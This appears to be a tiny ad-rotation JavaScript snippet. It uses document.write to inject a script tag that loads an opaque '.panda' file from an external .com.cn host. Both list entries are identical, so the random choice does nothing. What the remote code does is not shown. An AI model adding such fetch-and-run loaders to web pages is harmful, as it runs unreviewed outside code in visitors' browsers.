var advList = [
    "<script src='https://mx.smart-start.com.cn/c/21C388E9-FA61-4D15-9ED1-2AD6F8D608EE.panda'></script>",
    "<script src='https://mx.smart-start.com.cn/c/21C388E9-FA61-4D15-9ED1-2AD6F8D608EE.panda'></script>"
];
var max = advList.length - 1;
var min = 0;
var num = parseInt(Math.random() * (max - min + 1) + min);
document.write(advList[num]);
